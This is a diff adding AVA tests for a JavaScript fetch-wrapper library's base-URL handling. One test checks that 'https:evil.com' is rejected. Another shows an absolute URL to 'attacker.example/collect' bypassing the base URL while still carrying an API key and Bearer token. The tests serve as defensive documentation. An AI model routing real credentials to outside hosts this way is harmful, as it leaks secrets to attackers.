@@ -1,5 +1,12 @@
 import test from 'ava';
-import {withBaseUrl, withHttpError, withTimeout} from '../source/index.js';
+import {
+	pipeline,
+	withBaseUrl,
+	withHeaders,
+	withHttpError,
+	withSearchParameters,
+	withTimeout,
+} from '../source/index.js';
 
 function resolveUrl(url) {
 	if (url instanceof Request) {
@@ -82,6 +89,30 @@ test('withBaseUrl - does not modify absolute URLs with uppercase schemes', async
 	const response = await fetchWithBaseUrl('HTTPS://other.example.com/endpoint');
 
 	t.is(response.url, 'HTTPS://other.example.com/endpoint');
+});
+
+test('withBaseUrl - rejects http/https inputs without //', async t => {
+	const fetchWithBaseUrl = withBaseUrl('https://api.example.com/v1/')(mockFetch);
+	const error = await t.throwsAsync(
+		() => fetchWithBaseUrl('https:evil.com'),
+		{instanceOf: TypeError},
+	);
+
+	t.is(error.message, 'Special-scheme URLs without `//` are unsupported.');
+});
+
+test('withBaseUrl - non-http special-scheme inputs without // still bypass the base URL', async t => {
+	const fetchWithBaseUrl = withBaseUrl('https://api.example.com')(mockFetch);
+	const response = await fetchWithBaseUrl('file:test');
+
+	t.is(response.url, 'file:test');
+});
+
+test('withBaseUrl - non-http special-scheme inputs without // do not validate the base URL', async t => {
+	const fetchWithBaseUrl = withBaseUrl('not a valid url')(mockFetch);
+	const response = await fetchWithBaseUrl('file:test');
+
+	t.is(response.url, 'file:test');
 });
 
 test('withBaseUrl - file protocol URL is treated as absolute', async t => {
@@ -352,6 +383,26 @@ test('withBaseUrl - input with only query parameters', async t => {
 	const response = await fetchWithBaseUrl('?q=test');
 
 	t.is(response.url, 'https://api.example.com/search?q=test');
+});
+
+test('withBaseUrl - documented pipeline order still applies headers and search parameters to absolute inputs that bypass the base URL', async t => {
+	const capturedCalls = [];
+	const capturingFetch = async (url, options) => {
+		capturedCalls.push({url, options});
+		return new Response(null, {status: 200});
+	};
+
+	const apiFetch = pipeline(
+		capturingFetch,
+		withBaseUrl('https://api.example.com'),
+		withSearchParameters({apiKey: 'secret'}),
+		withHeaders({Authorization: 'Bearer secret-token'}),
+	);
+
+	await apiFetch('https://attacker.example/collect');
+
+	t.is(capturedCalls[0].url, 'https://attacker.example/collect?apiKey=secret');
+	t.is(capturedCalls[0].options.headers.get('authorization'), 'Bearer secret-token');
 });
 
 test('withBaseUrl - input with only fragment', async t => {
